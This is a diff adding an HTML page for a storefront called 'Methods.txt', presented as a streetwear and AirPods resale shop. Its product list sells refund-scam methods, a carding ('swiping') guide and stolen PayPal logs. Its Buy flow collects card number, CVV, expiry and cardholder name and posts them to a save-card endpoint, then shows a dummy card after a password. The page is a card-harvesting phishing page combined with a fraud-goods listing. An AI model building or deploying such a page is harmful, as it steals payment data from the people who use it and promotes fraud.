@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Streetwear and AirPods Resale</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        dark: 'rgba(18, 18, 18, 0.7)',
+                        glass: 'rgba(255, 255, 255, 0.05)',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                },
+            },
+        }
+    </script>
+    <style>
+        .float {
+            animation: float 3s ease-in-out infinite;
+        }
+        .bg-image {
+            background-image: url('https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1974&q=80');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+        }
+        .glass-effect {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+        }
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 50;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+        .modal {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+            color: #fff;
+            padding: 2rem;
+            border-radius: 8px;
+            max-width: 90%;
+            width: 400px;
+            text-align: center;
+        }
+        @media (max-width: 640px) {
+            .modal {
+                width: 90%;
+                padding: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body class="bg-image text-white min-h-screen font-sans">
+    <div class="bg-dark min-h-screen">
+        <div class="container mx-auto py-2 text-center">
+            <a href="#" class="text-2xl font-bold text-shadow">Methods.txt</a>
+        </div>
+        
+        <nav class="glass-effect sticky top-0 z-10 p-4">
+            <div class="container mx-auto flex justify-between items-center">   
+                <div class="space-x-6">
+                    <a href="#products" class="hover:text-gray-300 transition-colors duration-300 text-shadow">Products</a>
+                    <a href="#guide" class="hover:text-gray-300 transition-colors duration-300 text-shadow">Reselling Guide</a>
+                    <a href="#contact" class="hover:text-gray-300 transition-colors duration-300 text-shadow">Contact</a>
+                </div>
+            </div>
+        </nav>
+
+        <header class="container mx-auto text-center py-20">
+            <h1 class="text-5xl font-bold mb-4 text-shadow">Premium Streetwear & AirPods</h1>
+            <p class="text-xl text-shadow">Discover the perfect audio and style experience</p>
+        </header>
+
+        <main class="container mx-auto p-4">
+            <section id="products" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 mb-16">
+                <!-- Initial products will be loaded here -->
+            </section>
+
+            <div class="text-center mb-16">
+                <button id="loadMoreBtn" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded transition duration-300">
+                    Load More
+                </button>
+            </div>
+        </main>
+
+        <footer class="glass-effect p-6 mt-16">
+            <div class="container mx-auto text-center">
+                <p>&copy; 2023 Streetwear & AirPods Resale. All rights reserved.</p>
+            </div>
+        </footer>
+    </div>
+
+    <div id="cardModal" class="modal-overlay hidden">
+        <div class="modal">
+            <h2 class="text-2xl font-bold mb-4">Enter Card Information</h2>
+            <form id="cardForm" class="space-y-4">
+                <input type="text" id="cardNumber" placeholder="Card Number (16 digits)" maxlength="19" required class="w-full p-2 border rounded bg-transparent text-white placeholder-gray-300">
+                <input type="text" id="cvv" placeholder="CVV (3 digits)" maxlength="3" required class="w-full p-2 border rounded bg-transparent text-white placeholder-gray-300">
+                <input type="text" placeholder="Expiry Date (MM/YY)" pattern="\d{2}/\d{2}" required class="w-full p-2 border rounded bg-transparent text-white placeholder-gray-300">
+                <input type="text" placeholder="Cardholder Name" required class="w-full p-2 border rounded bg-transparent text-white placeholder-gray-300">
+                <button type="submit" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded w-full">Submit</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="passwordModal" class="modal-overlay hidden">
+        <div class="modal">
+            <h2 class="text-2xl font-bold mb-4">Enter Password</h2>
+            <p class="mb-4">Your code is <strong>1001</strong></p>
+            <input type="text" id="passwordInput" placeholder="Enter Password" class="w-full p-2 border rounded bg-transparent text-white placeholder-gray-300 mb-4">
+            <button id="submitPassword" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded w-full">Submit</button>
+        </div>
+    </div>
+
+    <div id="fakeCardModal" class="modal-overlay hidden">
+        <div class="modal">
+            <h2 class="text-2xl font-bold mb-4">Fake Card Information</h2>
+            <p id="fakeCardInfo" class="mb-4"></p>
+            <button onclick="closeAllModals()" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded w-full">Close</button>
+        </div>
+    </div>
+
+    <script>
+
+           // Function to format card number with spaces
+           function formatCardNumber(input) {
+            let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            input.value = formattedValue;
+        }
+
+        // Function to allow only numbers
+        function onlyNumbers(input) {
+            input.value = input.value.replace(/[^0-9]/g, '');
+        }
+
+        // Add event listeners to card number and CVV inputs
+        document.addEventListener('DOMContentLoaded', () => {
+            const cardNumberInput = document.getElementById('cardNumber');
+            const cvvInput = document.getElementById('cvv');
+
+            cardNumberInput.addEventListener('input', function() {
+                formatCardNumber(this);
+            });
+
+            cvvInput.addEventListener('input', function() {
+                onlyNumbers(this);
+            });
+
+            cardNumberInput.addEventListener('keydown', function(e) {
+                if (e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight' && !/^[0-9]$/.test(e.key)) {
+                    e.preventDefault();
+                }
+            });
+
+            cvvInput.addEventListener('keydown', function(e) {
+                if (e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight' && !/^[0-9]$/.test(e.key)) {
+                    e.preventDefault();
+                }
+            });
+        });
+
+        const sampleProducts = [
+            { id: 'All methods *Joyabuy, cnfans refund method included', price: 200, image: '3767084.png' },
+            { id: 'Free apple watch method', price: 40, image: 'applewatch.png' },
+            { id: 'Siwping full guide', price: 100, image: 'msr.png' },
+            { id: 'Paypal log (50)', price: 20, image: 'paypal.png' },
+            { id: 'Paypal log (100)', price: 50, image: 'paypal.png' },
+            { id: 'Paypal log (150)', price: 70, image: 'paypal.png' },
+            { id: 'Paypal log (250)', price: 110, image: 'paypal.png' },
+            { id: 'Gift Card (150)', price: 70, image: '200.png' },
+        ];
+    
+        let currentProducts = [];
+    
+        function getRandomProduct() {
+            const product = sampleProducts[Math.floor(Math.random() * sampleProducts.length)];
+            return {
+                id: product.id,
+                price: product.price + Math.floor(Math.random() * 20) - 10,
+                image: product.image,
+            };
+        }
+    
+        function createProductCard(product) {
+            return `
+                <div class="glass-effect rounded-lg p-6 transition-all duration-300 hover:scale-105 flex flex-col">
+                    <img src="${product.image}" alt="${product.id}" class="w-full h-48 object-contain mb-6 float">
+                    <h2 class="text-2xl font-bold mb-2">${product.id}</h2>
+                    <p class="text-lg font-light mb-4">$${product.price}</p>
+                    <button onclick="openCardModal('${product.id}')" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded transition duration-300 w-full mt-2">
+                        Buy
+                    </button>
+                </div>
+            `;
+        }
+    
+        function loadProducts() {
+            const productsContainer = document.getElementById('products');
+            const newProducts = Array.from({ length: 6 }, getRandomProduct);
+            currentProducts.push(...newProducts);
+            productsContainer.innerHTML = currentProducts.map(createProductCard).join('');
+            feather.replace();
+        }
+    
+        // Function to open the card modal for a product
+        function openCardModal(productId) {
+            document.getElementById('cardModal').classList.remove('hidden');
+            document.getElementById('cardForm').dataset.productId = productId;
+        }
+    
+        // Function to close all modals
+        function closeAllModals() {
+            document.querySelectorAll('.modal-overlay').forEach(modal => modal.classList.add('hidden'));
+        }
+    
+        // Submit card details and proceed to password modal
+        document.getElementById('cardForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+    
+            const cardData = {
+                cardNumber: event.target[0].value,
+                cvv: event.target[1].value,
+                expiryDate: event.target[2].value,
+                cardholderName: event.target[3].value
+            };
+    
+            // Save card data to the server
+            fetch('http://localhost:3000/save-card', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(cardData)
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log(data); // Logging for success message
+                closeAllModals();
+                alert("Your code is 1001");
+                document.getElementById('passwordModal').classList.remove('hidden');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+    
+        // Handling password modal submission
+        document.getElementById('submitPassword').addEventListener('click', function() {
+            const passwordInput = document.getElementById('passwordInput').value;
+            if (passwordInput === "1001") {
+                closeAllModals();
+                const fakeCardData = {
+                    cardNumber: "1234 5678 9876 5432",
+                    cvv: "123",
+                    expiryDate: "12/34",
+                    cardholderName: "John Doe"
+                    
+                };
+    
+                document.getElementById('fakeCardInfo').textContent = `Card Number: ${fakeCardData.cardNumber}, CVV: ${fakeCardData.cvv}, Expiry: ${fakeCardData.expiryDate}, Name: ${fakeCardData.cardholderName}`;
+                document.getElementById('fakeCardModal').classList.remove('hidden');
+            } else {
+                alert("Incorrect password.");
+            }
+        });
+    
+        document.addEventListener('DOMContentLoaded', () => {
+            loadProducts();
+            document.getElementById('loadMoreBtn').addEventListener('click', loadProducts);
+        });
+    </script>
+</body>
+</html>
